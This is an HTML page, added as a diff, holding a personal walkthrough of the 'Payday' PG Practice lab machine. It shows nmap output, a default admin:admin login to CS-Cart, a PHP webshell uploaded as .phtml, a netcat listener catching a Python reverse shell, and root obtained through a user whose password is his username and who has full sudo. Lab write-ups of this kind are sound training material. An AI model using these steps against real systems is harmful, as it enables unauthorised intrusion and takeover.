@@ -1,0 +1,163 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/machines/machines.css' %}">
+</head>
+<body>
+    <h1 class="title">PG Practice : Payday</h1>
+    <p class="text">Difficulty : Intermediate | CommunityRating : Intermediate | MyRating : Easy | ClearTime : > 40min</p>
+
+    <h2 class="subtitle">Enumeration</h2>
+    <div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo]
+└─$ sudo nmap -p- -sCV $IP --min-rate=10000
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-09 18:57 EST
+Nmap scan report for 192.168.231.39
+Host is up (0.091s latency).
+
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 f3:6e:87:04:ea:2d:b3:60:ff:42:ad:26:67:17:94:d5 (DSA)
+|_  2048 bb:03:ce:ed:13:f1:9a:9e:36:03:e2:af:ca:b2:35:04 (RSA)
+80/tcp  open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
+|_http-title: CS-Cart. Powerful PHP shopping cart software
+|_http-server-header: Apache/2.2.4 (Ubuntu) PHP/5.2.3-1ubuntu6
+110/tcp open  pop3        Dovecot pop3d
+|_ssl-date: 2025-12-09T23:57:14+00:00; -6s from scanner time.
+|_pop3-capabilities: UIDL TOP STLS PIPELINING SASL CAPA RESP-CODES
+| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Not valid before: 2008-04-25T02:02:48
+|_Not valid after:  2008-05-25T02:02:48
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|_    SSL2_RC2_128_CBC_WITH_MD5
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MSHOME)
+143/tcp open  imap        Dovecot imapd
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|_    SSL2_RC2_128_CBC_WITH_MD5
+| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Not valid before: 2008-04-25T02:02:48
+|_Not valid after:  2008-05-25T02:02:48
+|_imap-capabilities: completed OK LOGINDISABLEDA0001 Capability STARTTLS LITERAL+ MULTIAPPEND UNSELECT LOGIN-REFERRALS IMAP4rev1 NAMESPACE CHILDREN IDLE SORT THREAD=REFERENCES SASL-IR
+|_ssl-date: 2025-12-09T23:57:15+00:00; -6s from scanner time.
+445/tcp open  netbios-ssn Samba smbd 3.0.26a (workgroup: MSHOME)
+993/tcp open  ssl/imap    Dovecot imapd
+| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Not valid before: 2008-04-25T02:02:48
+|_Not valid after:  2008-05-25T02:02:48
+|_ssl-date: 2025-12-09T23:57:14+00:00; -6s from scanner time.
+|_imap-capabilities: completed OK Capability AUTH=PLAINA0001 LITERAL+ MULTIAPPEND UNSELECT LOGIN-REFERRALS IMAP4rev1 NAMESPACE CHILDREN IDLE SORT THREAD=REFERENCES SASL-IR
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|_    SSL2_RC2_128_CBC_WITH_MD5
+995/tcp open  ssl/pop3    Dovecot pop3d
+| ssl-cert: Subject: commonName=ubuntu01/organizationName=OCOSA/stateOrProvinceName=There is no such thing outside US/countryName=XX
+| Not valid before: 2008-04-25T02:02:48
+|_Not valid after:  2008-05-25T02:02:48
+| sslv2: 
+|   SSLv2 supported
+|   ciphers: 
+|     SSL2_DES_192_EDE3_CBC_WITH_MD5
+|     SSL2_RC4_128_WITH_MD5
+|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
+|     SSL2_RC4_128_EXPORT40_WITH_MD5
+|_    SSL2_RC2_128_CBC_WITH_MD5
+|_ssl-date: 2025-12-09T23:57:14+00:00; -6s from scanner time.
+|_pop3-capabilities: UIDL TOP PIPELINING USER SASL(PLAIN) CAPA RESP-CODES
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
+
+<p class="text">Though there are several open ports which we can dig deeper, I prioritized http port.</p>
+
+<div class="img">
+    <img src="{% static 'EthHack/images/payday/1.png' %}" alt="">
+    <p class="text">Opening http, we can see login form on the right side. This login form accespts default credential : admin:admin.</p>
+</div>
+
+<p class="text">Since the logoin page navigates user page, and there is no interesting information. However, researching CS-CART vulnerability, I found RCE .</p>
+<p class="text">Reading <a href="https://gist.github.com/momenbasel/ccb91523f86714edb96c871d4cf1d05c">this poc</a>, I found there is admin.php page which we can upload php file by naming it with .phtml extension.</p>
+<div class="img">
+    <img src="{% static 'EthHack/images/payday/2.png' %}" alt="">
+    <p class="text">First I jumped the href http://192.168.231.39/admin.php. <br><br>Since the user login form accespted admin:admin credential, I tested it again and it did accept it.</p>
+</div>
+
+<p class="text">Navigating to LOOK AND FEEL tab on the right side -> Template Editor</p>
+<div class="img">
+    <img src="{% static 'EthHack/images/payday/3.png' %}" alt="">
+    <p class="text">I grabbed <a href="https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/refs/heads/master/webshell.php">this webshell</a>, and named it webshell.phtml, and then uploaded it.</p>
+</div>
+
+
+<div class="img">
+    <img src="{% static 'EthHack/images/payday/4.png' %}" alt="">
+    <p class="text">We can use webshell by visiting http://192.168.231.39/skins/webshell.phtml.</p>
+</div>
+
+<p class="text">Since the target machine uses old kernel and OS version, we cannot use standard reverse shell code. But the target has python2. So, we can get revshell with python code.</p>
+
+<p class="text">I created python revshell code with <a href="https://www.revshells.com/">this site</a>, and simply pasted to Cmd: parameter. (I used python #2)</p>
+
+<div class="code-box"><pre><code>┌──(kali㉿kali)-[~/tempo]
+└─$ rlwrap nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.200] from (UNKNOWN) [192.168.231.39] 58950
+$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre></div>
+<p class="text">I got www-data user.</p>
+
+
+<h2 class="subtitle">PrivEsc</h2>
+<p class="text">Though mysql port 3306 is open on the target machie, it's rabbit hole and PE step is way too simpler.</p>
+<p class="text">The user patrick uses username as password, and he has all sudo rights.</p>
+<div class="code-box"><pre><code>$ su patrick
+su patrick
+Password: patrick
+
+patrick@payday:/var/www/core$ sudo -l
+sudo -l
+
+We trust you have received the usual lecture from the local System
+Administrator. It usually boils down to these three things:
+
+    #1) Respect the privacy of others.
+    #2) Think before you type.
+    #3) With great power comes great responsibility.
+
+[sudo] password for patrick:pasrick
+
+Sorry, try again.
+[sudo] password for patrick:patrick
+
+User patrick may run the following commands on this host:
+    (ALL) ALL</code></pre></div>
+
+    <p class="text">I simply generated bash with sudo.</p>
+    <div class="code-box"><pre><code>patrick@payday:/var/www/core$ sudo bash
+sudo bash
+root@payday:/root# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre></div>
+
+</body>
+</html>
